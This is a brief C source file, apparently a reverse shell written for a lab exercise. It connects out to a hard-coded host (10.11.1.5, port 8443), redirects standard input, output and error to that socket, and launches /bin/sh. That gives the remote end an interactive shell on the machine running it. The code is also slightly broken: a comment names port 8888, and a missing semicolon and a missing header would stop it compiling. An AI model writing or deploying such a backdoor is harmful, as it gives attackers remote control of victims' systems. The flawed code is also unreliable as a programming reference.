#include <stdio.h>
#include <strings.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define RHOST "10.11.1.5"	/* Remote host */
#define RPORT 8443		/* Remote port */

int hostfd
struct sockaddr_in server_addr;

int main()
{

	// create socket
	// int socket(int domain, int type, int protocol);
	hostfd = socket(AF_INET, SOCK_STREAM, 0);	

	// set server info
	server_addr.sin_family = AF_INET;		// IPv4
	server_addr.sin_addr.s_addr = inet_addr(RHOST);	// 10.11.1.5
	server_addr.sin_port = htons(RPORT);		// Port number (8888)

	// connect
	// connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
	connect(hostfd, (struct sockaddr *) &server_addr, sizeof(server_addr));


	// input, output, and error redirection
	// int dup2(int oldfd, int newfd);
	dup2(hostfd, 0);
	dup2(hostfd, 1);
	dup2(hostfd, 2);

	// execute shell - /bin/sh
	// int execve(const char *filename, char *const argv[], char *const envp[]);
	execve("/bin/sh", NULL, NULL);
	
}
